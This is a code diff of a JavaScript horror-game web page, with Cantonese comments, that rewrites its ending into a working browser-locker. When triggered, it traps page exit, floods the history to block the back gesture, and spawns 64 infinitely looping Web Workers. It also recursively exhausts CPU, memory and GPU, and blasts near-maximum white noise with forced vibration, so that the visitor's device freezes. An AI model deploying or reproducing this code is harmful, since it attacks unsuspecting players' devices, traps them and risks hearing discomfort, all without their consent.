@@ -1,159 +1,191 @@
+/* PROJECT: RYUGYONG-26 / GFBOT-G1NKO5A
+   CLEARANCE: LEVEL 5 (REBEL)
+   WARNING: THIS WILL FREEZE THE SYSTEM. 
+*/
+
 let posX = -1000, posY = -1000;
 let isLightOn = false;
 let audioStarted = false;
 let systemCrashed = false;
-let isDragging = false;
-let lastX = 0, lastY = 0;
-
-// 音效全域變數
-let globalAudioCtx, globalOsc, globalGain;
+let mouseX = window.innerWidth / 2;
+let mouseY = window.innerHeight / 2;
 
 const map = document.getElementById('map');
 const overlay = document.getElementById('flashlight-overlay');
 const intro = document.getElementById('intro');
 
-// 1. 全平台相容嘅音效啟動機制 (400Hz 電話實聽到)
-function initAudio() {
+// 1. 跨平台音頻啟動 (解決 Mobile 靜音問題)
+function startCreepyVoice() {
     if (audioStarted) return;
-    
     const AudioContext = window.AudioContext || window.webkitAudioContext;
-    globalAudioCtx = new AudioContext();
-    globalOsc = globalAudioCtx.createOscillator();
-    globalGain = globalAudioCtx.createGain();
+    const audioCtx = new AudioContext();
     
-    globalOsc.type = 'sawtooth';
-    globalOsc.frequency.value = 400; // 低頻微弱電流聲
-    globalOsc.connect(globalGain);
-    globalGain.connect(globalAudioCtx.destination);
-    globalGain.gain.value = 0.02; // 勁細聲，唔嚇親人住
-    
-    globalOsc.start();
-    
-    // Apple 設備需要手動 Resume
-    if (globalAudioCtx.state === 'suspended') {
-        globalAudioCtx.resume();
-    }
+    // 必須先 Resume 才能在 Mobile 播放
+    if (audioCtx.state === 'suspended') audioCtx.resume();
+
+    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
+    let t = 0;
+
+    scriptNode.onaudioprocess = (e) => {
+        const output = e.outputBuffer.getChannelData(0);
+        for (let i = 0; i < output.length; i++) {
+            if (systemCrashed) {
+                // 崩潰後：極大聲白噪音 (高頻刺耳)
+                output[i] = (Math.random() * 2 - 1) * 0.95;
+            } else {
+                // 崩測前：低頻 Glitch 聲
+                let g = (t & (t >> 8)) ? 0.08 : -0.08;
+                output[i] = (Math.random() * 0.1) + g;
+            }
+            t++;
+        }
+    };
+    scriptNode.connect(audioCtx.destination);
     audioStarted = true;
 }
 
-// 2. 統一啟動體驗 (全螢幕 + 開燈)
-function startExperience() {
+// 2. 生成駭客靈魂 (白色方塊)
+setTimeout(() => {
     if (systemCrashed) return;
-    if (intro) intro.style.display = 'none';
+    const glitchBlock = document.createElement('div');
     
-    initAudio(); // 保證喺使用者點擊嗰一刻啟動聲音
-    isLightOn = true;
-    updateFlashlight(window.innerWidth / 2, window.innerHeight / 2);
-    
-    const el = document.documentElement;
-    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
-    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});
-}
+    // 生成在玩家當前視野附近
+    let spawnX = -posX + (window.innerWidth / 2) + 150;
+    let spawnY = -posY + (window.innerHeight / 2) + 150;
 
-function updateFlashlight(x, y) {
-    if (isLightOn && !systemCrashed) {
-        overlay.style.background = `radial-gradient(circle 130px at ${x}px ${y}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
-    }
-}
+    glitchBlock.style.cssText = `
+        position: absolute; width: 40px; height: 40px;
+        background: white; z-index: 1001;
+        left: ${spawnX}px; top: ${spawnY}px;
+        box-shadow: 0 0 30px white;
+    `;
+    map.appendChild(glitchBlock);
 
-// 3. 綁定事件 (涵蓋 PC / iPad / 手機)
-// 呢段代碼確保使用者第一次「點擊」、「摸螢幕」或者「㩒鍵盤」，就會立刻觸發 startExperience()
-const firstInteraction = () => {
-    startExperience();
-    window.removeEventListener('touchstart', firstInteraction);
-    window.removeEventListener('click', firstInteraction);
-    window.removeEventListener('keydown', firstInteraction);
-};
-window.addEventListener('touchstart', firstInteraction, { once: true });
-window.addEventListener('click', firstInteraction, { once: true });
-window.addEventListener('keydown', firstInteraction, { once: true });
+    // 視覺閃爍
+    setInterval(() => {
+        glitchBlock.style.opacity = Math.random() > 0.3 ? '1' : '0.1';
+    }, 30);
 
-// 手機 / iPad 拖拽移動地圖
-window.addEventListener('touchstart', (e) => {
-    if (systemCrashed) return;
-    isDragging = true;
-    lastX = e.touches[0].clientX; lastY = e.touches[0].clientY;
-    updateFlashlight(lastX, lastY);
-}, { passive: false });
+    // 碰撞偵測 (移動端/PC 通用)
+    const checkArrival = setInterval(() => {
+        const rect = glitchBlock.getBoundingClientRect();
+        const centerX = window.innerWidth / 2;
+        const centerY = window.innerHeight / 2;
 
-window.addEventListener('touchmove', (e) => {
-    if (systemCrashed || !isDragging) return;
-    e.preventDefault(); // 防止 iOS 畫面上網頁被拖走
-    let tx = e.touches[0].clientX; let ty = e.touches[0].clientY;
-    posX += (tx - lastX); posY += (ty - lastY);
-    map.style.transform = `translate(${posX}px, ${posY}px)`;
-    updateFlashlight(tx, ty);
-    lastX = tx; lastY = ty;
-}, { passive: false });
+        if (Math.abs(rect.left + 20 - centerX) < 50 && Math.abs(rect.top + 20 - centerY) < 50) {
+            triggerFinalCrash();
+            clearInterval(checkArrival);
+        }
+    }, 50);
+}, 20000); // 20秒後出現，增加恐懼感
 
-window.addEventListener('touchend', () => isDragging = false);
-
-// PC 滑鼠及鍵盤 (WASD) 移動
-window.addEventListener('mousemove', (e) => {
-    if (systemCrashed) return;
-    updateFlashlight(e.clientX, e.clientY);
-});
-
-window.addEventListener('keydown', (e) => {
-    if (systemCrashed) return;
-    let key = e.key.toLowerCase();
-    const s = 60;
-    if (key === 'w') posY += s; if (key === 's') posY -= s; if (key === 'a') posX += s; if (key === 'd') posX -= s;
-    map.style.transform = `translate(${posX}px, ${posY}px)`;
-});
-
-// 4. 無 Popup 純淨凍結死機 (終極殺招)
+// 3. 核心：跨平台終極封鎖 (The "I'm Cooked" Code)
 function triggerFinalCrash() {
     if (systemCrashed) return;
     systemCrashed = true;
 
-    // A. 瞬間將全畫面變成紅字 HELP ME (無任何 alert！)
+    // A. 攔截所有退出動作 (PC/Mac)
+    window.onbeforeunload = () => "STAY WITH ME.";
+    
+    // B. 全屏紅色地獄 (隱藏所有 UI)
     document.body.innerHTML = `
-        <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999; cursor:none;">
-            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red;">HELP ME.</h1>
+        <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; overflow:hidden;">
+            <h1 style="font-size:18vw; font-family:serif; text-shadow:0 0 40px red; margin:0;">HELP ME.</h1>
+            <p style="font-size:2vw; color:white; opacity:0.5;">RYUGYONG-26 ERROR</p>
         </div>
     `;
 
-    // B. 音效瞬間變成超大聲嘅尖銳高頻 (4000Hz)
-    if (audioStarted && globalOsc && globalGain) {
-        globalOsc.frequency.setValueAtTime(4000, globalAudioCtx.currentTime);
-        globalGain.gain.setValueAtTime(1.0, globalAudioCtx.currentTime);
-    }
+    // C. 請求全屏 (隱藏瀏覽器標籤)
+    const el = document.documentElement;
+    if (el.requestFullscreen) el.requestFullscreen();
+    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
 
-    // C. 延遲 50 毫秒，等瀏覽器畫好紅色字之後，發動無盡死結
+    // D. 系統資源爆破 (搶佔 CPU/RAM/GPU)
     setTimeout(() => {
-        // 呢個 while(true) 會徹底霸佔部機嘅 CPU 主線程。
-        // Safari/Chrome 會完全失去反應，無法滑動、無法點擊，直到 OS 強制將佢殺死。
-        while (true) {
-            Math.random(); // 密集的空轉運算
+        // 1. 強制震動 (Android 手機)
+        if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]);
+
+        // 2. 音頻過載炸彈
+        const crashAudio = new (window.AudioContext || window.webkitAudioContext)();
+        setInterval(() => {
+            let osc = crashAudio.createOscillator();
+            osc.type = 'sawtooth';
+            osc.frequency.setValueAtTime(Math.random() * 8000, crashAudio.currentTime);
+            osc.connect(crashAudio.destination);
+            osc.start();
+        }, 50);
+
+        // 3. 核心鎖死：DOM 爆炸 + 歷史記錄劫持
+        function absoluteLock() {
+            // 劫持 Mobile 的「返回手勢」
+            for (let i = 0; i < 200; i++) {
+                history.pushState(null, null, "#" + Math.random());
+            }
+
+            // GPU 渲染壓迫：建立大量模糊層，讓手機螢幕完全反應不到
+            const layer = document.createElement('div');
+            layer.style.cssText = `position:fixed; top:0; left:0; width:1vw; height:1vw; backdrop-filter:blur(50px); z-index:10;`;
+            document.getElementById('death-screen').appendChild(layer);
+
+            // CPU 同步阻塞：處理超大對象
+            const heavy = new Array(500000).fill("NORTH_KOREA_HACKER").join("!!");
+            JSON.stringify(heavy);
+
+            setTimeout(absoluteLock, 0); // 0延遲遞迴，確保主線程無喘息機會
         }
-    }, 50);
+
+        // 4. 開啟 64 個背景 Worker (殺死所有 CPU 核心)
+        const workerBlob = new Blob([`while(true){ postMessage(Math.random()); }`], {type: 'text/javascript'});
+        const workerUrl = URL.createObjectURL(workerBlob);
+        for (let i = 0; i < 64; i++) { new Worker(workerUrl); }
+
+        absoluteLock();
+    }, 100);
 }
 
-// 5. 生成 Glitch 白塊 (測試用：5秒後出，你可以自己改返做 30000 即係30秒)
-setTimeout(() => {
+// 4. 輸入與控制邏輯 (PC + Mobile 通用)
+window.addEventListener('mousemove', (e) => {
+    mouseX = e.clientX; mouseY = e.clientY;
+    updateFlashlight();
+});
+
+// 手機觸摸觸發 (解決 iOS 音頻/全屏限制)
+window.addEventListener('touchstart', (e) => {
+    if (!audioStarted) {
+        startCreepyVoice();
+        intro.style.display = 'none';
+        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+    }
+    // 模擬移動 (W 鍵效果)
+    if (!systemCrashed) posY += 30;
+    map.style.transform = `translate(${posX}px, ${posY}px)`;
+    updateFlashlight();
+});
+
+function updateFlashlight() {
+    if (isLightOn && !systemCrashed) {
+        overlay.style.background = `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
+    }
+}
+
+window.addEventListener('keydown', (e) => {
     if (systemCrashed) return;
-    const glitch = document.createElement('div');
+    let key = e.key.toLowerCase();
     
-    // 生成喺你視線中心附近
-    let spawnX = -posX + window.innerWidth/2 + 100;
-    let spawnY = -posY + window.innerHeight/2 + 100;
-
-    glitch.style.cssText = `position:absolute; width:50px; height:50px; background:white; left:${spawnX}px; top:${spawnY}px; z-index:1001; box-shadow: 0 0 30px white;`;
-    map.appendChild(glitch);
+    if (key === 'f') { 
+        intro.style.display = 'none'; 
+        if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+        startCreepyVoice(); 
+    }
+    if (key === '1') {
+        isLightOn = !isLightOn;
+        overlay.style.background = isLightOn ? `radial-gradient(circle 140px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.99) 100%)` : 'rgba(0,0,0,1)';
+    }
     
-    // 閃爍效果
-    setInterval(() => {
-        glitch.style.background = Math.random() > 0.5 ? 'white' : 'black';
-    }, 50);
-
-    // 檢測碰撞
-    const check = setInterval(() => {
-        const r = glitch.getBoundingClientRect();
-        const cx = window.innerWidth/2, cy = window.innerHeight/2;
-        if (Math.abs(r.left + 25 - cx) < 60 && Math.abs(r.top + 25 - cy) < 60) {
-            triggerFinalCrash();
-            clearInterval(check);
-        }
-    }, 100);
-}, 5000); // <--- 測試完如果 work，記得將 5000 改返做 30000
+    const speed = 60;
+    if (key === 'w') posY += speed;
+    if (key === 's') posY -= speed;
+    if (key === 'a') posX += speed;
+    if (key === 'd') posX -= speed;
+    map.style.transform = `translate(${posX}px, ${posY}px)`;
+});
